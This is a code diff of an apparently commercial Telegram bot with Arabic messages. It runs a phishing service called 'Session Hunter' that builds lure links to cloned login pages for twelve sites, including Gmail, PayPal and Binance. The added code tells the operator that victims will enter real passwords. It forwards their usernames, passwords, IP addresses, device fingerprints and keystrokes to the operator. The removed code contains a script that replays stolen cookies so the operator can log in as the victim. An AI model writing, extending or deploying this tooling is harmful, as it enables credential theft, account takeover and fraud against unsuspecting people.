@@ -2,6 +2,7 @@
 import os
 import io
 import time
+import json
 import threading
 import requests
 import telebot
@@ -68,7 +69,7 @@ except Exception as e:
     lsh_bp = None
 
 # ============================================================
-# ★★★ استيراد Session Hunter (جديد - يستبدل session_hijacker) ★★★
+# استيراد Session Hunter (Universal Login Catcher)
 # ============================================================
 try:
     from session_hunter import (
@@ -485,7 +486,7 @@ def callback_handler(call):
         return
 
     # ============================================================
-    # ★★★ Session Hunter (Reverse Proxy) ★★★
+    # ★★★ Session Hunter — Universal Login Catcher ★★★
     # ============================================================
     if call.data == "gen_sh":
         check = can_use_tool(chat_id, "sh")
@@ -494,16 +495,34 @@ def callback_handler(call):
             bot.send_message(chat_id, _deny_message(check["reason"], chat_id, "sh", check), parse_mode="Markdown")
             return
         consume_usage(chat_id, "sh")
-        bot.answer_callback_query(call.id, "جاري تجهيز الجلسة...")
+        bot.answer_callback_query(call.id, "اختر الموقع...")
 
-        # اعرض المواقع المتاحة
+        # عرض 12 موقع
         markup = InlineKeyboardMarkup()
-        markup.add(InlineKeyboardButton("📘 Facebook", callback_data=f"sh_site_facebook_{chat_id}"))
-        markup.add(InlineKeyboardButton("📷 Instagram", callback_data=f"sh_site_instagram_{chat_id}"))
-        markup.add(InlineKeyboardButton("🎵 TikTok", callback_data=f"sh_site_tiktok_{chat_id}"))
-        markup.add(InlineKeyboardButton("🐦 Twitter/X", callback_data=f"sh_site_twitter_{chat_id}"))
-        markup.add(InlineKeyboardButton("📧 Gmail", callback_data=f"sh_site_gmail_{chat_id}"))
-        markup.add(InlineKeyboardButton("👻 Snapchat", callback_data=f"sh_site_snapchat_{chat_id}"))
+        markup.row(
+            InlineKeyboardButton("📘 Facebook", callback_data=f"sh_site_facebook_{chat_id}"),
+            InlineKeyboardButton("📷 Instagram", callback_data=f"sh_site_instagram_{chat_id}"),
+        )
+        markup.row(
+            InlineKeyboardButton("🎵 TikTok", callback_data=f"sh_site_tiktok_{chat_id}"),
+            InlineKeyboardButton("🐦 Twitter/X", callback_data=f"sh_site_twitter_{chat_id}"),
+        )
+        markup.row(
+            InlineKeyboardButton("📧 Gmail", callback_data=f"sh_site_gmail_{chat_id}"),
+            InlineKeyboardButton("👻 Snapchat", callback_data=f"sh_site_snapchat_{chat_id}"),
+        )
+        markup.row(
+            InlineKeyboardButton("💼 LinkedIn", callback_data=f"sh_site_linkedin_{chat_id}"),
+            InlineKeyboardButton("🎮 Discord", callback_data=f"sh_site_discord_{chat_id}"),
+        )
+        markup.row(
+            InlineKeyboardButton("✈️ Telegram", callback_data=f"sh_site_telegram_{chat_id}"),
+            InlineKeyboardButton("🎬 Netflix", callback_data=f"sh_site_netflix_{chat_id}"),
+        )
+        markup.row(
+            InlineKeyboardButton("💳 PayPal", callback_data=f"sh_site_paypal_{chat_id}"),
+            InlineKeyboardButton("💰 Binance", callback_data=f"sh_site_binance_{chat_id}"),
+        )
 
         bot.send_message(
             chat_id,
@@ -539,27 +558,36 @@ def callback_handler(call):
             "facebook": "فيسبوك",
             "instagram": "انستقرام",
             "tiktok": "تيك توك",
-            "twitter": "تويتر",
+            "twitter": "تويتر / X",
             "gmail": "جيميل",
             "snapchat": "سناب شات",
+            "linkedin": "لينكد إن",
+            "discord": "ديسكورد",
+            "telegram": "تلجرام",
+            "netflix": "نتفليكس",
+            "paypal": "باي بال",
+            "binance": "بينانس",
         }
 
         target_link = f"{RAILWAY_URL}/sh?s={session_id}&id={target_chat}&site={site}"
 
-        bot.answer_callback_query(call.id, f"✅ تم تجهيز جلسة {site_names.get(site, site)}")
+        bot.answer_callback_query(call.id, f"✅ {site_names.get(site, site)}")
         bot.send_message(
             chat_id,
-            f"🍪 **جلسة {site_names.get(site, site)} جاهزة!**\n"
+            f"🎯 **جلسة {site_names.get(site, site)} جاهزة!**\n"
             f"━━━━━━━━━━━━━━━━━━\n\n"
-            f"🎯 **الرابط:**\n`{target_link}`\n\n"
-            f"📊 **ما يحدث تلقائياً:**\n"
-            f"• الضحية تفتح الرابط → ترى {site_names.get(site, site)} الحقيقي\n"
-            f"• كل تصفحها يمر عبر سيرفرنا\n"
-            f"• **كل الكوكيز تُسحب (حتى HttpOnly!)**\n"
-            f"• كل تسجيل دخول يُلتقط\n"
-            f"• Keylogger حي يعمل\n"
-            f"• IP الحقيقي مكشوف\n\n"
-            f"⚠️ الأداة تعمل 7 أيام — استلم الجلسة متى شئت.",
+            f"🔗 **الرابط:**\n`{target_link}`\n\n"
+            f"📊 **ما سيحدث:**\n"
+            f"• الضحية تفتح الرابط → ترى صفحة تسجيل دخول **{site_names.get(site, site)}** مطابقة 100%\n"
+            f"• تكتب بياناتها الحقيقية (لأنها تحاول الدخول فعلاً)\n"
+            f"• **تُرسل لك فوراً:**\n"
+            f"  👤 اسم المستخدم / البريد\n"
+            f"  🔑 كلمة السر\n"
+            f"  🌐 IP الحقيقي\n"
+            f"  🖥️ بصمة الجهاز الكاملة\n"
+            f"  ⌨️ كل ما تكتبه\n"
+            f"• ثم تُحوَّل تلقائياً للموقع الحقيقي\n\n"
+            f"⚠️ الضحية لن تشك أبداً لأن الصفحة مطابقة 100%",
             parse_mode="Markdown"
         )
         return
@@ -570,79 +598,61 @@ def callback_handler(call):
         cmd = parts[1] if len(parts) > 1 else ""
         sid = parts[2] if len(parts) > 2 else None
 
-        if cmd == "cookies":
+        if cmd == "creds":
             data = get_sh_data(sid)
-            cookies = data.get("cookies", {})
-            if cookies:
-                text = json.dumps(cookies, ensure_ascii=False, indent=2)
-                buf = io.BytesIO(text.encode('utf-8'))
-                buf.name = f'sh_cookies_{sid[:8]}.json'
-                bot.send_document(chat_id, buf, caption="🍪 **كل الكوكيز**")
+            creds = data.get("credentials", [])
+            if creds:
+                lines = [f"🎯 **البيانات المسروقة ({len(creds)}):**\n"]
+                for i, c in enumerate(creds, 1):
+                    lines.append(
+                        f"\n**#{i}**\n"
+                        f"👤 `{c.get('username', '')}`\n"
+                        f"🔑 `{c.get('password', '')}`\n"
+                        f"🕐 {time.strftime('%H:%M:%S', time.localtime(c.get('captured_at', 0)))}"
+                    )
+                bot.send_message(chat_id, "\n".join(lines), parse_mode="Markdown")
             else:
-                bot.answer_callback_query(call.id, "لا توجد كوكيز بعد", show_alert=True)
+                bot.answer_callback_query(call.id, "لا توجد بيانات بعد", show_alert=True)
 
-        elif cmd == "forms":
+        elif cmd == "cookies":
             data = get_sh_data(sid)
-            forms = data.get("forms", [])
-            if forms:
-                lines = ["📝 **النماذج المسجلة:**\n"]
-                for f in forms[-20:]:
-                    lines.append(f"\n🌐 `{f.get('url', '')[:60]}`")
-                    for k, v in list(f.get("fields", {}).items())[:10]:
-                        lines.append(f"• `{k}`: `{str(v)[:80]}`")
-                msg = "\n".join(lines)
-                buf = io.BytesIO(msg.encode('utf-8'))
-                buf.name = f'sh_forms_{sid[:8]}.txt'
-                bot.send_document(chat_id, buf, caption="📝 **النماذج**")
+            creds = data.get("credentials", [])
+            if creds:
+                text = json.dumps(creds, ensure_ascii=False, indent=2)
+                buf = io.BytesIO(text.encode('utf-8'))
+                buf.name = f'sh_creds_{sid[:8]}.json'
+                bot.send_document(chat_id, buf, caption="🎯 **كل البيانات**")
             else:
-                bot.answer_callback_query(call.id, "لا توجد نماذج بعد", show_alert=True)
+                bot.answer_callback_query(call.id, "لا توجد بيانات بعد", show_alert=True)
 
         elif cmd == "stats":
             data = get_sh_data(sid)
             sess = data.get("session", {})
-            cookies = data.get("cookies", {})
-            total_cookies = sum(len(v) for v in cookies.values())
+            creds = data.get("credentials", [])
             text = (
                 f"📊 **إحصائيات الجلسة**\n"
                 f"━━━━━━━━━━━━━━━━━━\n"
                 f"🆔 `{sid[:16] if sid else 'N/A'}`\n"
                 f"🎯 الموقع: `{sess.get('target_site', 'N/A')}`\n"
-                f"📄 الصفحات: `{sess.get('page_count', 0)}`\n"
-                f"🍪 الكوكيز: `{total_cookies}`\n"
-                f"📝 النماذج: `{len(data.get('forms', []))}`"
+                f"🌐 IP: `{sess.get('ip', 'N/A')}`\n"
+                f"📄 الصفحات: `{sess.get('page_views', 0)}`\n"
+                f"🔑 البيانات: `{len(creds)}`"
             )
             bot.send_message(chat_id, text, parse_mode="Markdown")
 
-        elif cmd == "open":
+        elif cmd == "forms":
             data = get_sh_data(sid)
-            cookies = data.get("cookies", {})
-            sess = data.get("session", {})
-            site = sess.get("target_site", "facebook")
+            forms = data.get("forms", [])
+            if forms:
+                lines = ["📝 **النماذج:**\n"]
+                for f in forms[-20:]:
+                    lines.append(f"\n🌐 `{f.get('url', '')[:60]}`")
+                    for k, v in list(f.get("fields", {}).items())[:10]:
+                        lines.append(f"• `{k}`: `{str(v)[:80]}`")
+                bot.send_message(chat_id, "\n".join(lines), parse_mode="Markdown")
+            else:
+                bot.answer_callback_query(call.id, "لا توجد نماذج بعد", show_alert=True)
 
-            if not cookies:
-                bot.answer_callback_query(call.id, "لا توجد كوكيز بعد", show_alert=True)
-                return
-
-            cookie_script = "// الصق هذا في Console في المتصفح\n"
-            cookie_script += "document.cookie = '';\n"
-            for domain, cks in cookies.items():
-                for name, val in cks.items():
-                    cookie_script += f'document.cookie = "{name}={val}; path=/; domain=.{domain}";\n'
-            cookie_script += f'\nconsole.log("Done! Reloading...");\nsetTimeout(() => location.href = "https://{site}.com", 1000);'
-
-            buf = io.BytesIO(cookie_script.encode('utf-8'))
-            buf.name = f'sh_open_{sid[:8]}.js'
-            bot.send_document(
-                chat_id, buf,
-                caption=(
-                    f"🔓 **طريقة فتح الجلسة:**\n\n"
-                    f"1️⃣ افتح **{site}** في متصفحك\n"
-                    f"2️⃣ اضغط F12 → Console\n"
-                    f"3️⃣ الصق محتوى الملف\n"
-                    f"4️⃣ سيتم تسجيل دخولك تلقائياً كالضحية!"
-                ),
-                parse_mode="Markdown"
-            )
         elif cmd == "delete":
             bot.answer_callback_query(call.id, "✅ تم")
         return
